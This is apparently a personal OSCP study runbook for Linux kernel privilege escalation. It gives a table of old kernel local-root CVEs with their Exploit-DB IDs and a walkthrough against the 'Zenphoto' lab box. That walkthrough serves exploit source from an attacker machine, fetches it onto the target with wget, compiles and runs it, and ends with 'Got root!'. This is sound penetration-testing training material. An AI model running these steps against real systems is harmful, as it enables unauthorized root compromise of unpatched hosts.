---
tags: [oscp, privesc, linux, kernel, runbook]
box_sources: [Zenphoto]
---

# PrivEsc Linux — Kernel Exploit

*SUID, sudo, cron, and writable configs all failed. Check the kernel version — old boxes often have public local privilege escalation exploits.*

---

## Step 1 — Get Kernel Version

```bash
uname -a && cat /etc/issue
```

Note: **full version string** matters — e.g. `2.6.32-21-generic` vs `2.6.32-5`. The patch level matters, not just the major version.

---

## Step 2 — Search for Exploits

```bash
# Broad search first
searchsploit linux kernel <major.minor>
# e.g. searchsploit linux kernel 2.6.32

# Then narrow by technique keywords
searchsploit rds kernel
searchsploit dirty cow
searchsploit perf_events kernel
```

Cross-reference with Google: `"linux <version> local privilege escalation site:exploit-db.com"` — exploit-db entries often appear top of results.

Common kernel exploits by era:

| Kernel Range | CVE | EDB | Name |
|---|---|---|---|
| 2.6.30-2.6.36 | CVE-2010-3904 | 15285 | RDS Protocol LPE |
| 2.6.x | CVE-2010-3301 | 15023 | compat LPE (x86 on x86-64) |
| 2.6.x - 3.x | CVE-2012-0056 | 18411 | /proc/pid/mem write |
| 2.6.x - 4.8.3 | CVE-2016-5195 | 40839 | Dirty COW |
| < 3.9 | CVE-2013-2094 | 25444 | PERF_EVENTS |

---

## Step 3 — Transfer, Compile, Run

```bash
# On Kali — copy exploit and serve
cp /usr/share/exploitdb/exploits/linux/local/<id>.c exploits/
python3 -m http.server 8000

# On target — download, compile, execute
cd /tmp
wget http://$LocalIP:8000/exploits/<id>.c -O exploit.c
gcc exploit.c -o exploit
./exploit
```

If gcc is not available, compile on Kali targeting the same architecture:
```bash
gcc -m32 exploit.c -o exploit   # for i686 targets
```

Then transfer the binary instead of the source.

---

## Zenphoto Example (CVE-2010-3904)

```bash
# uname -a showed:
# Linux offsecsrv 2.6.32-21-generic Ubuntu 10.04.3 LTS i686

# searchsploit rds kernel found EDB-15285
cp /usr/share/exploitdb/exploits/linux/local/15285.c exploits/
python3 -m http.server 8000

# On target:
cd /tmp && wget http://192.168.45.194:8000/exploits/15285.c -O 15285.c
gcc 15285.c -o rds
./rds
# [*] Got root!

# Cleanup after:
rm /tmp/15285.c /tmp/rds
```

---

## Module Links

[[18. Linux Privilege Escalation]] | [[13. Locating Public Exploits]]

## External Resources

- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [GTFOBins](https://gtfobins.github.io) — check SUID/sudo before kernel
